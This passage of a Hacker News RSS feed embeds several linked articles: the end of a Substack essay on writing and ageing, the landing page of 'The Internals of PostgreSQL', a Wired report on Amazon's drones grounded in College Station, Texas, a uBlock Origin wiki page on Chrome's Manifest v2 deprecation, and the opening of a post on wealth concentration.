when he tried not to write, he was writing. He imagined paragraphs in his head, imagined whole novels, composed of sentences that weren’t even made up of words, just the </span><em>essence</em><span> of words, just the </span><em>gist</em><span> of language, letter-like shapes and colors that were combined in his head to generate the possibility of something that </span><em>could</em><span> be written. He knew no other way to live, no other way to fully exist in the world. He’d lived inside the bodies of the writers he read, and imagined, too, that people were living inside of his. It was the only form of intimacy he could understand, the only one he could bear.</span></p><p>Wanting to be seen and understood and appreciated is not a desire unique to the young. You might think it is. You might think a lot of desires are unique to youth. You are told that getting older is a process of shedding desire, but that’s not true: you retain into old age a keen awareness of the decades stretched out before you, and you desire – with a bewildered sort of desperation – to make them count for something. Silly dreams are only silly when they don’t come true. And they don’t cease to be silly until they’re discarded.</p><p>Like everyone and everything, he was slowly stripped of his Youth (or set free of it, if you’re the glass-half-full type), and the endless possibilities that perhaps never existed were nonetheless narrowed down to just this one: to be the person he’d become, to move his cut-out face one spot forward, to live this life until there was no more of it to live.</p><p data-attrs="{&quot;url&quot;:&quot;https://tolstoyan.substack.com/p/youth?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://tolstoyan.substack.com/p/youth?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p data-attrs="{&quot;url&quot;:&quot;https://tolstoyan.substack.com/p/youth/comments&quot;,&quot;text&quot;:&quot;Leave a comment&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://tolstoyan.substack.com/p/youth/comments" rel=""><span>Leave a comment</span></a></p></div></article></div><div id="discussion"><h4>Discussion about this post</h4></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Internals of PostgreSQL (181 pts)]]></title>
            <link>http://www.interdb.jp/pg/index.html</link>
            <guid>43241404</guid>
            <pubDate>Mon, 03 Mar 2025 13:14:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://www.interdb.jp/pg/index.html">http://www.interdb.jp/pg/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=43241404">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
      
      
      <nav id="topbar">
        <div><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li></li>
        <li><a href="#the-internals-of-postgresql">The Internals of PostgreSQL</a></li>
      </ul>
    </li>
  </ul>
</nav>
            </div>
      </nav>
      <main id="body-inner" tabindex="-1">
        <div>
          <article>
            


<figure>
    <img src="http://www.interdb.jp/pg/title2.png"> 
</figure>


<h6 id="whats-new">What’s New</h6>
<ul>
<li>14.Dec.2024: Added Conflicts in <a href="http://www.interdb.jp/pg/pgsql11/02.html#1124-conflicts" target="_blank">Section 11.2.4</a>.</li>
<li>13.Dec.2024: Added Replication Slots in <a href="http://www.interdb.jp/pg/pgsql11/04.html" target="_blank">Section 11.4</a>.</li>
<li>30.Nov.2024: Added Parallel Query in <a href="http://www.interdb.jp/pg/pgsql03/07.html" target="_blank">Section 3.7</a>.</li>
<li>28.Oct.2024: Added Incremental Backup in <a href="http://www.interdb.jp/pg/pgsql10/05.html" target="_blank">Section 10.5</a>.</li>
</ul>

<div>
    <p>
    <label for="expand-b6a6ee2b37dbd0a4ef23c6e0c20f4445">
        <i></i>
        <i></i>
        Change History (since 3rd June, 2018)
    </label></p>
</div>
<h3 id="the-internals-of-postgresql">The Internals of PostgreSQL</h3>

<p>PostgreSQL is a well-designed, open-source multi-purpose relational database system which is widely used throughout the world.</p>
<p>It is one huge system with the integrated subsystems, each of which has a particular complex feature and works cooperatively with each other.
Although understanding of the internal mechanism is crucial for both administration and integration using PostgreSQL, its hugeness and complexity make it difficult.</p>
<p>The main purposes of this document are to explain how each subsystem works, and to provide the whole picture of PostgreSQL.</p>
<p>This document covers versions 17 and earlier.</p>
<p><a href="https://www.google.com/search?q=%22interdb.jp%22+site:acm.org" target="_blank">Some academic papers</a> have referred to this document.
The <a href="https://item.jd.com/12527505.html" target="_blank" rel="noopener noreferrer">Chinese version</a> of this document was published in June 2019.</p>

<div>
  <p>Contents</p>
  <div>

<ul>
<li><a href="http://www.interdb.jp/pg/pgsql01.html">Chapter 1</a>. Database Cluster, Databases and Tables</li>
<li><a href="http://www.interdb.jp/pg/pgsql02.html">Chapter 2</a>. Process and Memory Architecture</li>
<li><a href="http://www.interdb.jp/pg/pgsql03.html">Chapter 3</a>. Query Processing</li>
<li><a href="http://www.interdb.jp/pg/pgsql04.html">Chapter 4</a>. Foreign Data Wrappers (FDW)</li>
<li><a href="http://www.interdb.jp/pg/pgsql05.html">Chapter 5</a>. Concurrency Control</li>
<li><a href="http://www.interdb.jp/pg/pgsql06.html">Chapter 6</a>. VACUUM Processing</li>
<li><a href="http://www.interdb.jp/pg/pgsql07.html">Chapter 7</a>. Heap Only Tuple (HOT) and Index-Only Scans</li>
<li><a href="http://www.interdb.jp/pg/pgsql08.html">Chapter 8</a>. Buffer Manager</li>
<li><a href="http://www.interdb.jp/pg/pgsql09.html">Chapter 9</a>. Write Ahead Logging (WAL)</li>
<li><a href="http://www.interdb.jp/pg/pgsql10.html">Chapter 10</a>. Online Backup and Point-In-Time Recovery (PITR)</li>
<li><a href="http://www.interdb.jp/pg/pgsql11.html">Chapter 11</a>. Streaming Replication<br></li>
</ul>
</div>
</div>

<h6 id="hironobu-suzuki">Hironobu SUZUKI</h6>
<p>I am a software programmer/engineer, the author of:</p>
<ul>
<li><a href="http://www.interdb.jp/pg/" target="_blank">The Internals of PostgreSQL</a></li>
<li><a href="http://www.interdb.jp/dl/" target="_blank">The Engineer’s Guide To Deep Learning</a></li>
<li><a href="https://github.com/s-hironobu/pg_plan_inspector" target="_blank">pg_plan_inspector</a></li>
<li><a href="https://github.com/s-hironobu/pg_tuner" target="_blank">pg_tuner</a></li>
</ul>
<p>I graduated from graduate school in information engineering (M.S. in Information Engineering),
have worked for several companies as a software developer and technical manager/director.
I published seven books in the fields of database and system integration (4 PostgreSQL books and 3 MySQL books).
In June 2019, the Chinese book of this document was published.</p>
<p>As a director of the Japan PostgreSQL Users Group (2010-2016), I organized the largest (non-commercial) technical seminar/lecture on PostgreSQL in Japan for more than six years,
and also served as the program committee chair of the Japan PostgreSQL Conference in 2013 and as a member in 2008 and 2009.</p>
<!--
In 2021, I released [pg_plan_inspector](https://github.com/s-hironobu/pg_plan_inspector) that is a framework to monitor and improve the performance of PostgreSQL using Machine Learning methods.
-->
<p>In June 2022, <a href="https://postgresql.life/post/hironobu_suzuki/" target="_blank">my interview article</a> was published in “PostgreSQL person of the week”.</p>
<!--
In May 2024, I released [pg_tuner](https://github.com/s-hironobu/pg_tuner) that is an automated PostgreSQL database parameter tuning tool based on the Bayesian Optimization.
-->
<p>Cuando era joven,  vivió en Sudamérica por unos años. Recientemente, a veces vuelve a allí.</p>
<p>I am looking for a new job, applying ML and AI technologies to DBMS.</p>
<p>
&nbsp;
<a href="https://github.com/s-hironobu" target="_blank" rel="noopener noreferrer"><i></i></a>
&nbsp;
&nbsp;
<a href="https://www.interdb.jp/blog/" target="_blank" rel="noopener noreferrer">Blog</a>
</p>
<h4 id="contact">Contact</h4>
<p>Please read the following FAQ before sending messages.</p>

<div>
    <p>
    <label for="expand-4150a6975ad08e21debadfe8adff3496">
        <i></i>
        <i></i>
        FAQ
    </label></p><div id="expandcontent-4150a6975ad08e21debadfe8adff3496">

<p>Since publishing my content, I’ve been fortunate to receive a lot of positive feedback, which is truly gratifying.
However, unfortunately, I’ve encountered individuals in the past who tried to misuse my content for self-promotion <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
<!--
However, unfortunately, I've had to deal with some unpleasant experiences in the past.
Here are a few examples:

- Repeated Manuscript Requests: Several individuals persistently requested my entire text for proofreading purposes.
Their intention, however, became clear soon: to plagiarize my work.
Althgough I offered them to ask proofreading a portion and I then review their results, they persisted to get all source (text + html framework) at once.
- Deceptive Publishing Proposal: One person pressured me to publish a book under his company name, not my name.
He misrepresented his motives, claiming he wanted to make my content widely recognized for my benefit, not his company's.
- Unauthorized Translations: I've encountered requests to surrender the text and rights for unauthorized translations into various languages several times.

These include companies that are still active in the PostgreSQL community.
-->
<p>These experiences have shaped the approach I’ve outlined below.</p>
<ol>
<li>Who can use this document freely?<br>
If you are a teacher or a student belonging to an educational organization, you can freely use this document and figures in your study.
Anyone can use this document and figures with noncommercial meetings and lectures, if you state the link to this site and the copyright; otherwise, contact me.</li>
<li>Is it available for commercial contents?<br>
This content can be used under two options:
<ul>
<li>Revenue Share:
You can leverage this content after a revenue share agreement is signed.
Under this agreement, you’ll share 20% of the sales generated from using this content.</li>
<li>Full Buyout:
In very rare cases, I consider requests for full commercial use of all content on this site.
For a complete buyout of all content rights, the cost is €5,000,000.</li>
</ul>
</li>
<li>Does the author need any help to write?<br>
No. I am writing for my own enjoyment.
Even if you send me your article, I will never include it in my document.</li>
<li>Why doesn’t the author use the GitBook or other e-book formats/sites?<br>
I am using the best tools I need and I will decide what I use.
I am always trying a lot of tools for better explanations.
<br>
Simply put, this document is optimized to read on html file and it is hard to convert to other formats.
<br>
I do not have any plan to make PDF version and Smartphone versions because of same reason.</li>
<li>Why doesn’t the author use RSS to notify the update?<br>
I keep my domain and my server to provide my document; you can read when you want to read. What do you want more?</li>
<li>Why doesn’t the author waive the copyright of this document or use the creative commons license?<br>
I’d like to ask you what problems you have by that I keep on having the copyright of my document.</li>
</ol>

</div>
</div>
<p>After reading, send a message to my twitter in public.</p>
<p><a href="mailto:info@interdb.jp"><i></i></a>
or
<a href="mailto:interdb.mx@gmail.com"><i></i></a>
&nbsp; / &nbsp;
<a href="http://twitter.com/suzuki_hironobu" target="_blank" rel="noopener noreferrer"><i></i></a>
&nbsp;</p>
<p>If you use email, please <strong>provide at least two SNS addresses (e.g. LinkedIn, Twitter) for verification purposes</strong>. Due to the XZ backdoor incident, I no longer accept contact from anonymous individuals.</p>
<h4 id="copyright">Copyright</h4>
<p>© Copyright ALL Right Reserved, Hironobu SUZUKI.</p>
<p>For any inquiries regarding the use of this document or any of its figures, please contact me.</p>
<p><span><span><i></i></span><span>Exception</span></span> Educational institutions can use this document freely.</p>

            
          </article>
        </div>
      </main>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Amazon’s delivery drones are grounded in College Station, Texas (102 pts)]]></title>
            <link>https://www.wired.com/story/texas-amazon-drones-stop-flying/</link>
            <guid>43241212</guid>
            <pubDate>Mon, 03 Mar 2025 12:44:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wired.com/story/texas-amazon-drones-stop-flying/">https://www.wired.com/story/texas-amazon-drones-stop-flying/</a>, See on <a href="https://news.ycombinator.com/item?id=43241212">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-testid="ArticlePageChunks"><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>As the spring planting season arrives in College Station, Texas, certified master gardener Mark Smith is thrilled that peace is in the air. This time last year, a loud buzzing noise began disrupting Smith’s morning routine of checking on the peppers, tomatoes, herbs, and shrubs growing in his backyard. Several times an hour, an Amazon Prime Air delivery drone would <a href="https://www.youtube.com/watch?v=ARANW44Muxo">noisily</a> emerge about 800 feet away, just past a line of trees behind Smith’s home. His neighbors began calling the fleet <a data-offer-url="https://www.facebook.com/watch/?extid=CL-UNK-UNK-UNK-IOS_GK0T-GK1C&amp;v=610870954496214" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.facebook.com/watch/?extid=CL-UNK-UNK-UNK-IOS_GK0T-GK1C&amp;v=610870954496214&quot;}" href="https://www.facebook.com/watch/?extid=CL-UNK-UNK-UNK-IOS_GK0T-GK1C&amp;v=610870954496214" rel="nofollow noopener" target="_blank">flying chainsaws</a>. Smith, a retired civil engineer, preferred a different comparison: “It was like your neighbor runs their leaf blower all day long,” he says. “It was just incessant.”</p><p>Amid <a href="https://www.wired.com/story/amazon-delivery-drones-heat-grounded-summer/">technical</a> and <a href="https://www.wired.com/story/crashes-and-layoffs-plague-amazons-drone-delivery-pilot/">regulatory</a> challenges, Amazon’s decade-plus quest to fly small items such as toothpaste and batteries to people’s yards in under an hour has yielded just thousands of deliveries. The experience in College Station has highlighted another challenge: <a href="https://www.wired.com/story/big-tech-isnt-the-problem-with-homelessness-its-all-of-us/">NIMBYs</a>—or people who push for developments to be “not in my backyard”—potentially curtailing where Amazon operates.</p><p>Over the past few years, drone delivery companies have started operating in several towns and cities across the US without much fuss. The Federal Aviation Administration conducted environmental reviews of <a data-offer-url="https://www.faa.gov/uas/advanced_operations/nepa_and_drones" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.faa.gov/uas/advanced_operations/nepa_and_drones&quot;}" href="https://www.faa.gov/uas/advanced_operations/nepa_and_drones" rel="nofollow noopener" target="_blank">21 planned drone rollouts</a> over the past four years, none of which received more than three critical public comments or any organized opposition—except for one location.</p><p>In College Station, a university town of about 125,000 people, hundreds of ordinary residents along with the mayor and other officials banded together last year to oppose Amazon’s proposal to more than double the number of daily local drone flights. The FAA received about 150 comments opposing the plans, including from homeowners’ associations and other groups.</p><p>A parent said their teenage daughter feared using the swimming pool because of the drone’s camera. (Amazon says it faces forward, not down). A 92-year-old worried about doves that were no longer visible from a kitchen window. Many claimed their homes were losing value. One resident said their peace and quiet was being “invaded by some billionaire's insatiable desire to make even more money.”</p><p>In early July last year, councilmember Bob Yancy emailed the mayor and two city officials, explaining that complaints would intensify if Amazon didn’t move the drones. “Amazon’s MO thus far is to conduct aggressive PR efforts writ large while ignoring the immediately affected neighborhood,” Yancy wrote, according to public records obtained by WIRED. “Without causing a public stink around their project, for their sake and ours, I think we need to quietly secure some assurances that they will act immediately to directly address neighborhood concerns.”</p><p>The FAA ultimately <a data-offer-url="https://www.faa.gov/uas/advanced_operations/nepa_and_drones/FINAL-College-Station-Supplemental-EA-23Sept2024.pdf" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.faa.gov/uas/advanced_operations/nepa_and_drones/FINAL-College-Station-Supplemental-EA-23Sept2024.pdf&quot;}" href="https://www.faa.gov/uas/advanced_operations/nepa_and_drones/FINAL-College-Station-Supplemental-EA-23Sept2024.pdf" rel="nofollow noopener" target="_blank">determined</a> that some of the public concerns were meritless or outside its purview and that Amazon’s proposed expansion wouldn’t cause significant environmental impacts. But the local pushback still got through to the tech giant. Company representatives sought city officials’ help in getting contact information for homeowners’ associations near the drone depot, according to the email records. Meetings ensued between Amazon and homeowners, and by the end of July, Amazon communicated its intent to relocate within the city. (Yancy tells WIRED that Prime Air is a valued member of the community and, as long as it is mindful of the noise, he hopes it stays.)</p></div><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>Over the summer, Amazon reduced the number of drone flights. In November, it fully adopted newer, quieter drones in College Station that deliver within a range of about 7.5 miles. Inside his house, with the double-paned windows shut and TV on, Smith could no longer hear the drones. More recently, wet winter weather has further restricted the frequency of flights. (Amazon spokesperson Sam Stephenson says the drones can withstand only light rain and limited temperatures.)</p><p>But things finally went back to fully normal for Smith and other residents of the woodsy communities near Amazon’s drone base in January, when the company temporarily grounded its drones nationwide for a software update process that is ongoing. Amazon plans to end its College Station lease on September 30, potentially giving the frustrated communities permanent quiet.</p><p>If Amazon had conducted the maximum number of flights outlined in its plans reviewed by the FAA, a drone might have buzzed by Smith’s house about every 58 seconds for 15 hours a day. Now, he hasn’t seen one in weeks.</p><p>Residents say they have noticed wildlife return to the area. Paul Greer, who lives near the drone depot, says he heard an owl for the first time in months. Deer also are more abundant with the drones gone, he says. Even Greer’s dog, George, is at peace. Seeing and hearing the drones during walks agitated his 50-pound bull terrier. “I don’t think anybody expected the noise to be as invasive as it has been,” Greer says.</p><p>Amazon’s Stephenson reiterates that the FAA review determined that the operations would not have a significant impact on wildlife and says that College Station officials conducted a test that found the drones operated below the city’s noise limits. “We work hard to listen to the community and to mitigate any potential impact from our operations,” Stephenson says. Since the company launched its new MK30 drone, he says, it hasn’t “received any community complaints, and the feedback from local officials has been positive.”</p><p>Some of the College Station residents who have complained about the noise say they still largely support the testing of drones. But many believe Amazon miscalculated by locating its depot close to so many residences. The company’s first depot—now shut down—was located near businesses and vineyards in rural California. Its third and newest location is at one of its warehouses in a quiet Arizona town. A planned site in the UK is also based at a fulfillment center and largely bounded by fields and industrial parks. “I don’t think we should ban this,” Smith says of drone delivery. “If there’s a place for it, and the market needs it, then fine, but it shouldn’t mess up the peace in the neighborhood.”</p><p>Amazon’s drone sector rivals, such as DroneUp and <a href="https://www.wired.com/2014/08/google-reveals-project-wing-its-two-year-effort-to-build-delivery-drones/">Alphabet’s Wing</a>, have made many more deliveries, mostly by operating out of commercial areas and forming partnerships with physical retailers. That’s not so easy for Amazon, <a href="https://www.wired.com/story/amazons-all-powerful-buy-box-is-at-the-heart-of-its-new-antitrust-troubles/">the nation’s dominant online shopping platform</a>. It has plenty of logistics warehouses, but they’re not necessarily located close enough to customers for delivery drones to reach them.</p><h2>Location, Location, Location</h2><p>Amazon has said little about how it chose the location of its College Station drone hub, which <a data-offer-url="https://www.aboutamazon.com/news/transportation/amazons-drone-delivery-is-coming-to-texas" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.aboutamazon.com/news/transportation/amazons-drone-delivery-is-coming-to-texas&quot;}" href="https://www.aboutamazon.com/news/transportation/amazons-drone-delivery-is-coming-to-texas" rel="nofollow noopener" target="_blank">it began leasing in 2022</a>. Residents such as Smith believe privacy may have played a role. The building Amazon leased is tucked away behind trees, limiting what might be visible to prying eyes. Stephenson, the Amazon spokesperson, says its choice of location involved “thorough analysis of the area” and “close collaboration with local leaders.”</p><p>Smith says that during a series of community events Amazon hosted in 2022, some College Station residents were miffed by how the company highlighted cookies rather than urgent necessities as items Prime Air could deliver. He and others also asked to see the drones in action to gauge how loud they might be, but the company refused. “We ended up getting it without actually hearing it,” he says. Amazon’s Stephenson says that the demonstrations weren’t possible, because the FAA didn’t approve the drones to take flight until the end of the year when commercial operations began.</p></div><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>As flights began picking up early last year, the people who live closest to the drone depot started fuming over the noise. Residents appealed to the city to do something, but Texas lawmakers have essentially banned cities from regulating drones, leaving local officials powerless.</p><p>Smith, who previously worked as a city public works director in charge of big projects, says the only developments that he had seen attract this amount of opposition were landfills. The drone pushback also attracted international media attention, sparking concerns at city hall.</p><p>Public records show city officials have suggested numerous options for Amazon’s potential relocation, including a mall about 4 miles up the highway from the current building. As of December, though, College Station mayor John Nichols wrote in one email, Amazon had not shared any recent updates about the status of its search. Nichols tells WIRED that as of last week, he still hadn't heard anything.</p><h2>Lessons Learned</h2><p>Some College Station residents who live near Amazon’s drone depot site say the noise and property value concerns raised by their neighbors are overblown. “What were people like when lawnmowers first came out?” says Kim Miller, who could hear the drones above her front yard and once received a dog toy by air as a gift from someone. “Progress has some drawbacks,” she says.</p><p>Raylene Lewis, a real estate agent at NextHome Realty Solutions, which has listings near the drone base, says home buyers don’t seem to mind the prospect of drones overhead. In fact, more people are curious about whether a prospective home is within Prime Air’s delivery range, she says. Lewis’ own house happens to be just outside the perimeter, but she says she would love to use the service “whether I want cookies or my medicine or pen and paper for a kid’s project.”</p><p>Lewis believes Amazon should have been more forthright about its operations and should have offered a local customer service center for people with questions and concerns. With updates still difficult to come by, some residents remain frustrated. Several of them learned about Amazon’s fleet grounding only after inquiries from WIRED.</p><p>The grounding followed two crashes—one related to rainy weather and the other operator miscommunications—of the roughly 80-pound drones, <a data-offer-url="https://www.bloomberg.com/news/articles/2025-01-17/amazon-pauses-drone-deliveries-after-aircraft-crashed-in-rain" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.bloomberg.com/news/articles/2025-01-17/amazon-pauses-drone-deliveries-after-aircraft-crashed-in-rain&quot;}" href="https://www.bloomberg.com/news/articles/2025-01-17/amazon-pauses-drone-deliveries-after-aircraft-crashed-in-rain" rel="nofollow noopener" target="_blank">according to Bloomberg</a>. Amazon’s Stephenson disputes the cause of the pause, saying it was initiated to “safely and properly conduct a software update” and that services will resume following FAA approval.</p><p>The accidents have introduced a new worry in College Station. “These events really bring out that Amazon is using my neighborhood as a test zone,” says Monica Williams, a teenager who opposed the company’s expansion plan.</p><p>For now, more drones are poised to hit the skies. In Dallas-Fort Worth, Amazon rival Wing <a data-offer-url="https://www.faa.gov/uas/advanced_operations/nepa_and_drones/20241201_Wing-Draft-SEA" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.faa.gov/uas/advanced_operations/nepa_and_drones/20241201_Wing-Draft-SEA&quot;}" href="https://www.faa.gov/uas/advanced_operations/nepa_and_drones/20241201_Wing-Draft-SEA" rel="nofollow noopener" target="_blank">is awaiting FAA review</a> to triple its maximum deliveries per day to 30,000. In Florida, the company is <a data-offer-url="https://www.faa.gov/uas/advanced_operations/nepa_and_drones/20241218-Draft-EA-Wing-Central-Florida.pdf" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.faa.gov/uas/advanced_operations/nepa_and_drones/20241218-Draft-EA-Wing-Central-Florida.pdf&quot;}" href="https://www.faa.gov/uas/advanced_operations/nepa_and_drones/20241218-Draft-EA-Wing-Central-Florida.pdf" rel="nofollow noopener" target="_blank">seeking review</a> to provide up to 60,000 deliveries each day, starting from Walmart supercenters in the Orlando and Tampa metro areas.</p><p>Smith and others in College Station expect that as long as drones aren’t constantly buzzing near homes—and new versions get increasingly quieter—complaints will be minimal. He believes Amazon learned a valuable lesson in his city, and he’s glad the company is adjusting its course. His garden is certainly happy to have him back.</p><p><em>Additional reporting by Aarian Marshall.</em></p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[About Google Chrome's "This extension may soon no longer be supported" (255 pts)]]></title>
            <link>https://github.com/gorhill/uBlock/wiki/About-Google-Chrome%27s-%22This-extension-may-soon-no-longer-be-supported%22</link>
            <guid>43239774</guid>
            <pubDate>Mon, 03 Mar 2025 08:56:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/gorhill/uBlock/wiki/About-Google-Chrome%27s-%22This-extension-may-soon-no-longer-be-supported%22">https://github.com/gorhill/uBlock/wiki/About-Google-Chrome%27s-%22This-extension-may-soon-no-longer-be-supported%22</a>, See on <a href="https://news.ycombinator.com/item?id=43239774">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="wiki-body" data-view-component="true">
                <p>Starting with Google Chrome 127, there will be a warning for uBlock Origin (uBO) in your <code>chrome://extensions/</code> page:</p>
<p><img src="https://private-user-images.githubusercontent.com/585534/354625184-40c6c11f-aef5-4b97-ba2b-c63dc76f219e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDEwMDE3MDEsIm5iZiI6MTc0MTAwMTQwMSwicGF0aCI6Ii81ODU1MzQvMzU0NjI1MTg0LTQwYzZjMTFmLWFlZjUtNGI5Ny1iYTJiLWM2M2RjNzZmMjE5ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMzAzJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDMwM1QxMTMwMDFaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT04MTQwMWIxOWIyNjczYWI5MjAxYTkwZDM1MDU5NTg1N2U1NmQxZGI0NTJkODY2YjI5NWJkN2E3NGEyNjIwMWYzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.shtSHKuCBBlNEyb6tJvbKR3kbaBQf7o26NHvc-Aw460" alt="a" content-type-secured-asset="image/png"></p>
<p>This is the result of <a href="https://developer.chrome.com/docs/extensions/develop/migrate/mv2-deprecation-timeline" rel="nofollow">Manifest v2 support</a> being deprecated in favor of <a href="https://developer.chrome.com/docs/extensions/develop/migrate/what-is-mv3" rel="nofollow">Manifest v3</a>.</p>
<p>uBO is a Manifest v2 extension, hence the warning in your Google Chrome browser. There is no Manifest v3 version of uBO, hence the browser will suggest alternative extensions as a replacement for uBO:</p>
<p><img src="https://private-user-images.githubusercontent.com/585534/354626846-2dc9d217-5c52-441a-b406-e29180707df8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDEwMDE3MDEsIm5iZiI6MTc0MTAwMTQwMSwicGF0aCI6Ii81ODU1MzQvMzU0NjI2ODQ2LTJkYzlkMjE3LTVjNTItNDQxYS1iNDA2LWUyOTE4MDcwN2RmOC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMzAzJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDMwM1QxMTMwMDFaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT05ZDJlMDcwMWZlNTM3Nzk2NmRlZTY4Yjg1ODFlMzIzZTExZTZjOTY2N2Y5MTc4YjQ2MGI0ZDNmNGQyOGYxM2Q1JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.XTb8DumKWRS7PpQIQlQUNtfG2m2VvfccDarDze6sglw" alt="b" content-type-secured-asset="image/png"></p>
<p><a href="https://github.com/uBlockOrigin/uBOL-home">uBO Lite (uBOL)</a> is a pared-down version of uBO with a best effort at converting filter lists used by uBO into a Manifest v3-compliant approach, with a focus on reliability and efficiency as has been the case with uBO since first published in June 2014.</p>
<p>However the focus on reliability and efficiency in a Manifest v3 environment meant having to sacrifice many features beyond those not possible within a Manifest v3 framework.</p>
<p>See the <a href="https://github.com/uBlockOrigin/uBOL-home/wiki/Frequently-asked-questions-(FAQ)">official uBOL FAQ webpage</a> for more details about how uBOL compares to uBO.</p>
<p>Manifest v2 uBO will not be automatically replaced by Manifest v3 uBOL. uBOL is too different from uBO for it to silently replace uBO -- you will have to explicitly make a choice as to which extension should replace uBO according to your own prerogatives.</p>
<p>Ultimately whether uBOL is an acceptable alternative to uBO is up to you, it's not a choice that will be made for you.</p>
<p><h3>Will development of uBO continue?</h3><a id="user-content-will-development-of-ubo-continue" aria-label="Permalink: Will development of uBO continue?" href="#will-development-of-ubo-continue"></a></p>
<p>Yes, there are other browsers which are not deprecating Manifest v2, e.g. <a href="https://blog.mozilla.org/addons/2024/03/13/manifest-v3-manifest-v2-march-2024-update/" rel="nofollow">Firefox</a>.</p>
<p><h3>Links</h3><a id="user-content-links" aria-label="Permalink: Links" href="#links"></a></p>
<p>There also exists a related helpful discussion regarding an official way to extend Manifest v2 support in Chrome up to June 2025 via <code>ExtensionManifestV2Availability</code> policy: <a href="https://github.com/uBlockOrigin/uBlock-issues/discussions/2977#discussioncomment-8134456">Chrome Web Store migration plan?</a>.</p>
<p>Other notable discussions regarding uBO, uBOL and Manifest v2 &amp; v3:</p>
<ul>
<li><a href="https://github.com/uBlockOrigin/uBlock-issues/issues/338">Chrome extension manifest v3 proposal</a></li>
<li><a href="https://github.com/uBlockOrigin/uBlock-issues/discussions/2261">uBO Minus/Lite discussion</a></li>
<li><a href="https://github.com/uBlockOrigin/uBlock-issues/issues/3309">"This extension may soon no longer be supported"</a></li>
</ul>

              </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The top 10% owns 87% of the stocks (328 pts)]]></title>
            <link>https://awealthofcommonsense.com/2025/02/the-top-10/</link>
            <guid>43239249</guid>
            <pubDate>Mon, 03 Mar 2025 07:42:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://awealthofcommonsense.com/2025/02/the-top-10/">https://awealthofcommonsense.com/2025/02/the-top-10/</a>, See on <a href="https://news.ycombinator.com/item?id=43239249">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="container" role="main">

							
								<article id="post-60965" role="article" itemscope="" itemtype="http://schema.org/BlogPosting">

									<!-- <div class="header-ad">
									</div>  -->

									<header>


										

										

									</header> <!-- end article header -->

									<section itemprop="articleBody">
										<p>The top 10% owns 87% of the stocks in this country.</p>
<p>They also own 84% of the private businesses, 44% of real estate and two-thirds of overall wealth.</p>
<img fetchpriority="high" decoding="async" src="https://awealthofcommonsense.com/wp-content/uploads/2025/02/image-183.png" alt="" width="1749" height="984" srcset="https://awealthofcommonsense.com/wp-content/uploads/2025/02/image-183.png 1749w, https://awealthofcommonsense.com/wp-content/uploads/2025/02/image-183-300x169.png 300w, https://awealthofcommonsense.com/wp-content/uploads/2025/02/image-183-1024x576.png 1024w, https://awealthofcommonsense.com/wp-content/uploads/2025/02/image-183-768x432.png 768w, https://awealthofcommonsense.com/wp-content/uploads/2025/02/image-183-1536x864.png 1536w" sizes="(max-width: 1749px) 100vw, 1749px">
